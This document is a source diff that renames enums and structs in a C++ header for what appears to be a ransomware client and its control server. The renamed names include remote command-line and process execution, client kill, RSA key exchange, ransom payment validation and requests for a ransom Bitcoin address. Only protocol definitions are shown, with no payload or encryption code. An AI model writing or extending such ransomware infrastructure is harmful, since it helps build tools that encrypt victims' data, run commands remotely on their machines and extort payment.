@@ -6,26 +6,26 @@
 // Usually after a remoteaction is completed
 // 'C' = Code
 enum ClientResponseCode {
-    C_OK                = 0,
-    C_ERROR             = -1,
+    kResponseOk    = 0,
+    kResponseError = -1,
 };
 
 // Enums dictating which action to perform on the client
 // Sent from the server to client
 enum RemoteAction {
-    NONE                   = -1,
-    USE_CLI                = 0x832182,
-    OPEN_REMOTE_PROCESS    = 0x317238,
-    KILL_CLIENT            = 0x821921, // forcefully disconnect the client
-    PING_CLIENT            = 0x94932,
-    SEND_PUBLIC_RSA_KEY    = 0x392191,
-    RETURN_PUBLIC_RSA_KEY  = 0x403920, // respond to a request that asked for a public rsa key
-    RETURN_PRIVATE_RSA_KEY = 0x94811,
+    kNone,
+    kUseCommandLineInterface,
+    kOpenRemoteProcess,
+    kKillClient, // forcefully disconnect the client
+    kPingClient,
+    kSendPublicRSAKey,
+    kReturnPublicRSAKey, // respond to a request that asked for a public rsa key
+    kReturnPrivateRSAKey,
 };
 
 enum SocketTypes {
-    UDP = 1,
-    TCP = 2,
+    UDP,
+    TCP,
 };
 
 /*
@@ -64,7 +64,7 @@ struct Server {
 */
 struct ClientResponse {
     std::string        message;         // String message, detailed info on the error or action
-    ClientResponseCode responseCode = C_ERROR;    
+    ClientResponseCode responseCode = kResponseError;    
     RemoteAction       actionPerformed; // ( if any, otherwise put NONE )
     long               id; // identify different clientreponses from eachother
 };
@@ -124,7 +124,7 @@ struct ServerCommand {
     RemoteAction       action;
 
     ServerCommand(
-        RemoteAction action=RemoteAction::NONE, 
+        RemoteAction action=RemoteAction::kNone, 
         ProcessInformation pi={},
         std::string cliArgs="",
         std::string rsaPubKey="",
@@ -153,13 +153,13 @@ struct UDPResponse {
 */
 struct ClientRequest {
     enum Action {
-        NONE                           = 0x000000,
-        CONNECT_CLIENT                 = 0x100000,
-        REQUEST_PUBLIC_ENCRYPTION_KEY  = 0x200000,
-        REQUEST_PRIVATE_ENCRYPTION_KEY = 0x92321,
-        VALIDATE_RANSOM_PAYMENT        = 0x300000,
-        REQUEST_RANSOM_BTC_ADDRESS     = 0x400000,
-        PING                           = 0x500000,
+        kNone = 0,
+        kConnectClient,
+        kRequestPublicEncryptionKey,
+        kRequestPrivateEncryptionKey,
+        kValidateRansomPayment,
+        kRequestRansomBTCAddress,
+        kPing,
     };
 
     BOOL              valid;
